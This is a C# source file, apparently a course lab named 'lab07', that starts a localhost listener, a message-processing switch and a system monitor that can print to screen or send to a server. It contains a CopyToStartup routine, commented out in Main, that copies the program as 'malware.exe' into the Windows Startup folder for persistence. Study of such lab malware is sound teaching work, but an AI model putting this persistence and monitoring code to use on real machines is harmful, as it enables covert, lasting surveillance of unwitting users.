using System;
using System.IO;
using System.Collections.Generic;
using System.Threading;
using Framework;
using static Framework.Logger;
using static Framework.Utilities;

namespace lab07
{
    class Program
    {
        const string name = "Program";
        const int clientport = 25560;
        const int serverport = 25561;
        const string clientip = "127.0.0.1";
        const string serverip = "127.0.0.1";
        const string servername = "server";
        const LoggingLevels level = LoggingLevels.None;
        const bool PrintOrSend = false;  //  f is print to screen, t is send to server



        static void Main(string[] args)
        {
            GlobalLoggingLevel = level;
            const string routine = "Main";
            Entering(name, routine);

            //  this is disabled because you are compiling from source, which means this won't work
            //CopyToStartup();

            Debug(name, routine, "Instantiating request queue...");
            var queue = new Queue<IncomingRequest>();

            Debug(name, routine, "Starting server...");
            var server = new FrwServer(clientip, 25560, servername, queue, GlobalLoggingLevel);
            var t1 = new Thread(server.StartListener);
            t1.Start();
            Debug(name, routine, $"Server is now listening on IP {clientip} Port {clientport}.");

            Debug(name, routine, "Starting service switch...");
            var serviceswitch = new Switch(queue);
            var t2 = new Thread(serviceswitch.ProcessMessages);
            t2.Start();
            Debug(name, routine, "Services started.");

            Debug(name, routine, "Starting system monitor...");
            var monitor = new Monitor(serverip, serverport);
            monitor.StartMonitoring(PrintOrSend);
            Debug(name, routine, "Monitor started.");

            while (true)
            {
                Thread.Sleep(30000);
            }
        }

        static void CopyToStartup()
        {
            const string routine = "CopyToStartup";
            Entering(name, routine);

            var currentpath = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + "malware.exe";
            var startuppath = Environment.ExpandEnvironmentVariables("%AppData%/Microsoft/Windows/Start Menu/Programs/Startup/malware.exe");
            File.Copy(currentpath, startuppath);
        }
    }
}
